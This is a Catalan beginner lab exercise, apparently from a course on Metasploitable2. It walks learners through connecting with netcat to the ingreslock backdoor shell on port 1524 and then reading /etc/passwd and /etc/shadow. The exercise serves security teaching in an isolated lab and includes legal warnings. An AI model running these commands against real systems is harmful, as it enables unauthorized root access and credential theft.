---
id: EX-08-20
title: "Ingreslock shell al port 1524 - Explicat per a gent inexperta"
status: draft
version: 2.0
created: 2026-08-07
updated: 2026-08-07
authors:
  - Bernat Mora
  - Hermes Agent
tags:
  - per-a-principiants
  - explicacio-detallada
prerequisites:
  - LAB-15-10
  - ANN-09
related:
  - LAB-15-10
  - ANN-08
  - ANN-09
estimated_time: 30 min
difficulty: beginner
---

# EX-08-20 - Ingreslock shell al port 1524 - Explicat per a gent inexperta

> Aprendre a accedir a un shell obert al port 1524.

## Que necessites saber

### Que es el port 1524?

El **port 1524** es el port **ingreslock**, normalment associat amb la base de dades **Ingres**.

Pero al **Metasploitable2** esta **obert amb un shell directament accessible**. Es una porta del darrere.

### Que es un shell?

Un **shell** es una **terminal** que permet executar comandes al sistema. Si es **root** (administrador), tens **control total**.

### Que es /etc/passwd?

Es un **fitxer** del sistema Linux que llista **tots els usuaris**. Es public (es pot llegir), pero nomes **root** pot veure `/etc/shadow` (contrasenyes).

### Que es /etc/shadow?

Es un **fitxer** que conte les **contrasenyes xifrades**. Nomes **root** pot llegir-lo.

Si pots veure aquest fitxer, tens el sistema **compromès**.

### Que es netcat?

Si no saps que es netcat, llegeix [EX-08-13](ex-08-13-vsftpd-backdoor-exploit.md).

### Glossari

- **port 1524**: port ingreslock
- **shell**: terminal amb acces al sistema
- **root**: usuari administrador
- **/etc/passwd**: fitxer amb usuaris del sistema
- **/etc/shadow**: fitxer amb contrasenyes xifrades

## Que has de fer

1. Des del Kali, obre una terminal
2. Comprova el port: `nmap -sV -p 1524 10.10.30.30`
3. Connecta amb netcat: `nc -nv 10.10.30.30 1524`
4. Si veus un prompt (# o $), ja hi ets!
5. Escriu `id`
6. Escriu `whoami`
7. Escriu `ls /`
8. Escriu `cat /etc/passwd`
9. Prova `cat /etc/shadow`
10. Desconecta amb Ctrl+D

## Que has de buscar

- Has pogut connectar?
- Quin usuari ets?
- Pots llegir /etc/shadow?
- Per que existeix aquest port?
- Com podem protegir?

## Preguntes que has de respondre

1. Has pogut connectar?
2. Ets root?
3. Com podem protegir aquest port?

## Si no entens alguna cosa

1. **Torna a llegir** la seccio "Que necessites saber"
2. **Mira** [ANN-09](ann-09-comencar-de-zero.md) - Guia per a gent inexperta
3. **Mira** [ANN-08](ann-08-glossari-ports.md) - Glossari de ports
4. **Pregunta** si segueixes sense entendre

## Solucio de problemes

Si alguna cosa no funciona:

1. **Comprova** que el lab esta actiu (`docker ps` al Kali)
2. **Comprova** que tens acces a Internet des del Kali
3. **Comprova** que la IP que estas fent servir es correcta
4. **Llegeix** l'error amb atencio - sovint diu que passa

## Validacio

Quan acabis, compara els teus resultats amb els del document [LAB-15-11](../labs/lab-15-11-nmap-complet-metaploitable2.md).

## Seguretat

**Recorda**:
- Aixo es **nomes per practicar** al lab
- Mai en sistemes **reals** sense permis
- Practicar sense permis es **IL·LEGAL**
- Si tens dubtes, pregunta

## Referencies

- [ANN-09](ann-09-comencar-de-zero.md) - Començar de zero
- [ANN-08](ann-08-glossari-ports.md) - Glossari de ports
- [LAB-15-10](../labs/lab-15-10-lab-real-muntat.md) - Lab real muntat al Kali
- [LAB-15-11](../labs/lab-15-11-nmap-complet-metaploitable2.md) - Nmap complet
